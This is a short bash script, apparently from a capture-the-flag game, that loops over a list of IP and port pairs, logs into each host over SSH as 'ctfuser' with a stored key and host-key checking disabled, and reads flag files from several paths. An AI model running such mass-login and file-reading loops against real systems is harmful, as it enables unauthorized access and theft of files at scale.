while read -r ip port; do
    ssh_port=$((port + 22))
    timeout 3 ssh -o "BatchMode=Yes" \
        -o "StrictHostKeyChecking=no" \
        -o "GlobalKnownHostsFile=/dev/null" \
        -o "UserKnownHostsFile=/dev/null" \
        -o "ConnectTimeout=3" \
        -i ~/hazy \
        -p "$ssh_port" \
        ctfuser@"$ip" "cat /f* 2>/dev/null; echo; cat f* 2>/dev/null; echo; cat /opt/f* 2>/dev/null; echo; exit 0" 2>/dev/null < /dev/null
done < ip_port.txt
